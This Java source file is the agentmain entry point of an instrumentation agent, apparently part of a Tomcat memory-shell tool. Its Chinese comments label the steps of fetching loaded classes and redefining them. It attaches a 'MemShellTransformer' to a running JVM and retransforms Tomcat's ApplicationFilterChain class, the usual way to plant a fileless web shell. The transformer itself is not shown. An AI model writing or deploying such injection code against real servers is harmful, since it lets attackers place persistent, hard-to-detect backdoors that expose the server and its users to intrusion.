import java.lang.instrument.Instrumentation;

public class MemShellAgentMain {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public static void agentmain(String agentArgs, Instrumentation ins) {
        ins.addTransformer(new MemShellTransformer(),true);
        // 获取所有已加载的类
        Class[] classes = ins.getAllLoadedClasses();
        for (Class clas:classes){
            if (clas.getName().equals(ClassName) && ins.isModifiableClass(clas)){
                try{
                    // 对类进行重新定义
                    ins.retransformClasses(new Class[]{clas});
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
}
